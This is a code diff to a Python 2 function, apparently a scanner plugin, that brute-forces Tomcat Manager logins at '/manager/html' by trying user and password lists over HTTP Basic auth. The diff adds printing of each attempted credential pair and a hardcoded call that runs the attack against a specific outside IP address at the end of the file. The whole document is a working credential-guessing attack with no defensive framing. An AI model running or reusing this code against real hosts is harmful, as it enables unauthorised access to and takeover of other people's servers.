@@ -11,6 +11,7 @@ def check(host,port,timeout):
     for user in user_list:
         for password in pass_list:
             try:
+                print user+":"+password
                 login_url = url+'/manager/html'
                 request = urllib2.Request(login_url)
                 auth_str_temp=user+':'+password
@@ -22,6 +23,7 @@ def check(host,port,timeout):
             except urllib2.HTTPError,e:
                 res_code = e.code
                 res_html = e.read()
+                continue
             except urllib2.URLError,e:
                 error_i+=1
                 if error_i >= 3:
@@ -44,3 +46,6 @@ def check(host,port,timeout):
                         pass
                     return 'YES|'+info
     return 'NO'
+
+
+check('111.13.46.225',80,10)
